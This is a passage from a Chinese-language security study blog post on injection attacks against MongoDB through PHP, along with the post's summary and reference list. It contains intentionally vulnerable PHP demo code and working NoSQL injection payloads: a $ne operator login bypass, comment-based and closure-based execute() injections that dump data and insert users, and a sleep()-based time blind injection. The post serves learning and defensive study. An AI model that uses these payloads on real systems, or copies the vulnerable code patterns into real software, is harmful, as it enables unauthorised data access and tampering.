class="hljs-keyword">array</span>(<span class="hljs-string">&quot;justOne&quot;</span> =&gt; <span class="hljs-literal">true</span>));<br><br><span class="hljs-comment">// 显示可用文档数据</span><br><span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">find</span>();<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$document</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$document</span>[<span class="hljs-string">&quot;title&quot;</span>] . <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>访问之后，即删除了title为World的文档，在数据库中查不到Mi1k集合的文档内容了。</p>
+<h3 id="使用execute-函数执行字符串"><a href="#使用execute-函数执行字符串" class="headerlink" title="使用execute-函数执行字符串"></a>使用execute()函数执行字符串</h3>
+<p>使用的Demo大致如下，此时传进方法execute()的参数就是字符串变量$query（特别的，此时的字符串书写语法为JS的书写语法）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mongoclient</span>();<br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;myinfo; <span class="hljs-comment">//选择数据库</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;db.table.save(&#123;&#x27;newsid&#x27;:1&#125;)&quot;</span>;    <span class="hljs-comment">//增</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;db.table.find(&#123;&#x27;newsid&#x27;:1&#125;)&quot;</span>;    <span class="hljs-comment">//查</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;db.table.remove(&#123;&#x27;newsid&#x27;:1&#125;)&quot;</span>;    <span class="hljs-comment">//减</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;db.table.update(&#123;&#x27;newsid&#x27;:1&#125;,&#123;&#x27;newsid&#x27;,2&#125;)&quot;</span>;    改<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="5-3-PHP-MongoDB注入攻击"><a href="#5-3-PHP-MongoDB注入攻击" class="headerlink" title="5-3-PHP-MongoDB注入攻击"></a>5.3 PHP MongoDB注入攻击</h2>
+<p>不同编程语言环境下的MongoDB注入情景没啥差别，这里主要对PHP中实现的MongoDB进行详细分析，理解原理和场景就OK，其他语言就大致给Demo就好。</p>
+<p>在此之前，我们需要先初始化数据库、赋给一些用户数据用于后面的Demo使用，这里随机添加10个用户，最后一个test用户为公共用户、大家都知道的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span><br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test;            <span class="hljs-comment">// 选择一个数据库</span><br><span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;test; <span class="hljs-comment">// 选择集合</span><br><span class="hljs-variable">$ori</span> = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwsyz&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$j</span>++) &#123; <br>        <span class="hljs-variable">$str</span> .= <span class="hljs-variable">$ori</span>[<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ori</span>)-<span class="hljs-number">1</span>)];<br>    &#125;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;userid&#x27;</span>=&gt;<span class="hljs-variable">$i</span>,<br>        <span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-string">&#x27;user&#x27;</span>.<span class="hljs-variable">$i</span>,<br>        <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-variable">$str</span><br>        );<br>    <span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;添加成功&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;userid&#x27;</span>=&gt;<span class="hljs-number">10</span>,<br>    <span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span><br>    );<br><span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户test添加成功&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>访问触发一遍即可创建成功：</p>
+<p class='item-img' data-src='image-20231015114445664.png'><img src="image-20231015114445664.png" alt="image-20231015114445664"></p>
+<h3 id="PHP数组注入-重言式注入"><a href="#PHP数组注入-重言式注入" class="headerlink" title="PHP数组注入-重言式注入"></a>PHP数组注入/重言式注入</h3>
+<p>一个数组绑定的查询代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span><br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;test; <span class="hljs-comment">//选择数据库</span><br><span class="hljs-variable">$coll</span> = <span class="hljs-variable">$db</span>-&gt;test; <span class="hljs-comment">//选择集合</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>,<br>        <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-variable">$password</span><br>        );<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$coll</span>-&gt;<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-variable">$count</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">count</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span>&gt;<span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username:&#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password:&#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;未找到&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>当我们用公共用户test输入时，显示出username和password：</p>
+<p class='item-img' data-src='image-20231015114522868.png'><img src="image-20231015114522868.png" alt="image-20231015114522868"></p>
+<p>分析一下，这里我输入的是<code>?username=test&amp;password=test</code>，然后进入到MongoDB中的语句其实为<code>db.test.find(&#123;username:'test',password:'test'&#125;);</code>。</p>
+<p>若此时我们以PHP数组的形式输入<code>?username[a]=test&amp;password=test</code>，源码中$data的值便为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">$data <span class="hljs-operator">=</span> <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;username&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;test&#x27;</span>),<br>        <span class="hljs-string">&#x27;password&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;test&#x27;</span><br>        );<br></code></pre></td></tr></table></figure>
+<p>最后实际MongoDB执行的语句为<code>db.test.find(&#123;username:&#123;a:'test'&#125;,password:'test'&#125;);</code>。</p>
+<p>因此，我们就可以利用这个特性往数组的键名传递一个操作符（大于，小于，等于，不等于等等），从而达到利用的目的：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?username[$ne]=1&amp;password[$ne]=1<br></code></pre></td></tr></table></figure>
+<p>$ne即not equal不等于，转换到MongoDB语句即为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">db.test.find(&#123;username:&#123;&#x27;$ne&#x27;:&#x27;1&#x27;&#125;,password:&#123;&#x27;$ne&#x27;:&#x27;1&#x27;&#125;&#125;);<br></code></pre></td></tr></table></figure>
+<p>而该语句相当于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> username<span class="hljs-operator">!=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">!=</span><span class="hljs-string">&#x27;1&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p>直接爆出了所有数据库用户信息：</p>
+<p class='item-img' data-src='image-20231015114632550.png'><img src="image-20231015114632550.png" alt="image-20231015114632550"></p>
+<h3 id="execute-执行拼接字符串导致的注入-联合查询注入"><a href="#execute-执行拼接字符串导致的注入-联合查询注入" class="headerlink" title="execute-执行拼接字符串导致的注入-联合查询注入"></a>execute()执行拼接字符串导致的注入/联合查询注入</h3>
+<p>代码如下，为了方便查看注入的语句，我这里添加了输出查询语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;var data = db.test.findOne(&#123;username:&#x27;<span class="hljs-subst">$username</span>&#x27;,password:&#x27;<span class="hljs-subst">$password</span>&#x27;&#125;);return data;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();<br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;test;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;ok&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;retval&#x27;</span>]!=<span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username:&#x27;</span>.<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;retval&#x27;</span>][<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password:&#x27;</span>.<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;retval&#x27;</span>][<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;未找到&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;errmsg&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>可以看到，是直接拼接起来的字符串然后传入execute()函数中执行。</p>
+<p>正常访问：</p>
+<p class='item-img' data-src='image-20231015120642489.png'><img src="image-20231015120642489.png" alt="image-20231015120642489"></p>
+<p>添加个单引号试试，发现会报错：</p>
+<p class='item-img' data-src='image-20231015120649925.png'><img src="image-20231015120649925.png" alt="image-20231015120649925"></p>
+<p>此时可以利用注释或闭合的方法针对性地实现注入就可以了。</p>
+<h4 id="利用注释"><a href="#利用注释" class="headerlink" title="利用注释"></a>利用注释</h4>
+<p>按照输出的提示语句以及报错信息逐个尝试，目的是成功注释掉后面的password部分语句并返回成功，当输入如下payload时成功返回：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?username=test&#x27;&#125;);return true;&#125;)//&amp;password=test<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015120741891.png'><img src="image-20231015120741891.png" alt="image-20231015120741891"></p>
+<p>这里返回username和password两项，按照MongoDB数据的Json格式，我们可以让其返回Json键值对看看：</p>
+<p class='item-img' data-src='image-20231015120758248.png'><img src="image-20231015120758248.png" alt="image-20231015120758248"></p>
+<p>没问题，剩下的就是各种payload尝试了。</p>
+<p>爆数据库版本：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?username=test&#x27;&#125;);return &#123;username:db.version(),password:1&#125;;&#125;)//&amp;password=test<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015120835290.png'><img src="image-20231015120835290.png" alt="image-20231015120835290"></p>
+<p>爆当前数据库所有集合，这里因为db.getCollectionNames()返回的是数组、需要用tojson()转换为字符串，另外MongoDB函数区分大小写：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?username=test&#x27;&#125;);return &#123;username:tojson(db.getCollectionNames()),password:1&#125;;&#125;)//&amp;password=test<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015120913560.png'><img src="image-20231015120913560.png" alt="image-20231015120913560"></p>
+<p>爆其他集合第一条数据，我这里本地新建user集合并插入文档，若想继续遍历爆其他信息只需修改数组下标即可：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?username=test&#x27;&#125;);return &#123;username:tojson(db.user.find()[0]),password:1&#125;;&#125;)//&amp;password=test<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015120948575.png'><img src="image-20231015120948575.png" alt="image-20231015120948575"></p>
+<p>往user集合插入新用户数据：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?username=test&#x27;&#125;);return &#123;username:db.user.insert(&#123;&#x27;username&#x27;:&#x27;mi1k7ea&#x27;,&#x27;password&#x27;:&#x27;mi1k7ea&#x27;&#125;),password:1&#125;;&#125;)//&amp;password=test<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015121028062.png'><img src="image-20231015121028062.png" alt="image-20231015121028062"></p>
+<h4 id="利用闭合"><a href="#利用闭合" class="headerlink" title="利用闭合"></a>利用闭合</h4>
+<p>构造如下payload，用于闭合后面的语句使语法正确：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?username=test&#x27;&#125;);return &#123;username:db.version(),password:1&#125;;var b=(&#123;a:&#x27;1&amp;password=test<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015121125642.png'><img src="image-20231015121125642.png" alt="image-20231015121125642"></p>
+<p>剩下的其他利用和前面的一样，这里只说个重点的，在无回显的情况下，我们就需要用到盲注技巧，这里用到的盲注是基于时间的盲注，在高版本下MongoDB添加了sleep()函数，我们利用这个sleep()函数和闭合的技巧来实现基于时间的盲注（这种盲注技巧仅在闭合的情况下可行，本人在注释的情况下并未成功）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?username=test&#x27;&#125;);if (db.version()&gt;&quot;0&quot;)&#123;sleep(10000);exit;&#125;var b=(&#123;a:&#x27;1&amp;password=test<br></code></pre></td></tr></table></figure>
+<p>若数据库版本大于0，则sleep 10s：</p>
+<p class='item-img' data-src='image-20231015121203275.png'><img src="image-20231015121203275.png" alt="image-20231015121203275"></p>
+<p>剩下的就是进阶的了，可参考下面的</p>
+<h1>0x06 总结</h1>
+<p>emmm本次文章呢，旨在初步了解各种常用数据库的常规注入语句，进阶的内容的很少（但我心里认为还是有必要深度学习一下的）不过我感觉学好MySQL的话也是很有帮助的，剩下的可以遇到的时候百度什么的。</p>
+<p>本文呢也只是简单总结一下，copy rate is 99.9999999999…%（我也不想啊，太菜了，遇到不会的知识，以目前的我根本没能力写出高质量的文章（也就是用自己的语言以及思考去写），只得抄袭众多大佬的，但希望这些知识可以变成自己的，不论如何我都会努力提升自己，在日后提升文章质量（毕竟只有这样，我认为才学的深刻吧），本文也会一直更新（难免实战遇到来更新一下）。</p>
+<p>加油！！</p>
+<h1>0x07 参考文章</h1>
+<h2 id="mssql参考"><a href="#mssql参考" class="headerlink" title="mssql参考"></a>mssql参考</h2>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#42-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">MSSQL 注入与提权方法整理</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TheTai/p/14371392.html">Mysql 隐式类型转换</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/mssql-injection-learn/">MSSQL 注入学习笔记</a></p>
+<p><a target="_blank" rel="noopener" href="https://macchiato.ink/web/web_security/mssql_injection_setup/">MSSQL注入环境搭建</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/286862.html">渗透测试之基础篇：Microsoft SQL Server手注之联合查询注入</a> --靶场实战参考</p>
+<h2 id="postgresql参考"><a href="#postgresql参考" class="headerlink" title="postgresql参考"></a>postgresql参考</h2>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249371.html">postgresql注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/%E8%BD%AF%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/PostgreSQL.md">[PostgreSQL]</a></p>
+<h2 id="Oracle参考"><a href="#Oracle参考" class="headerlink" title="Oracle参考"></a>Oracle参考</h2>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/oracle-sql-inject/">Oracle SQL注入学习</a>  --含提权</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7897">关于学习Oracle注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/oracle%E6%B3%A8%E5%85%A5/">[Oracle注入]</a></p>
+<p><a target="_blank" rel="noopener" href="https://550532788.github.io/2020/08/10/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Oracle%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">从零开始的Oracle注入学习</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">【实战】Oracle注入总结</a></p>
+<h2 id="MongoDB参考"><a href="#MongoDB参考" class="headerlink" title="MongoDB参考"></a>MongoDB参考</h2>
+<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/#0x04-PHP-MongoDB%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">NoSQL注入之MongoDB</a></p>
+<p><a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/02/27/MongoDB%E6%B3%A8%E5%85%A5/">MongoDB注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#">MongoDB 注入指北 丨</a></p>
+<p><a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/3939">http://drops.wooyun.org/tips/3939</a></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/15/Web_php_wrong_nginx_config/">← 下一篇 Web_php_wrong_nginx_config</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/12/NewStarCTF%202023/">NewStarCTF 2023 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 Msssql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E8%87%AA%E5%B8%A6%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 自带库介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 符号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 基本注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">2.7.</span> <span class="toc-text">2.7 联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-8-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.8.</span> <span class="toc-text">2.8 布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-9-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.9.</span> <span class="toc-text">2.9 时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 PostgreSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E9%AA%8C%E8%AF%81%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 验证注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">3.5.</span> <span class="toc-text">3.5  堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.6.</span> <span class="toc-text">3.6 联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%BC%8F%E5%90%8D%E7%A7%B0%EF%BC%88schemaname%EF%BC%89%E5%90%8D%E7%A7%B0"><span class="toc-number">3.6.0.1.</span> <span class="toc-text">获取模式名称（schemaname）名称</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%E7%A7%B0"><span class="toc-number">3.6.1.</span> <span class="toc-text">获取数据表名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0"><span 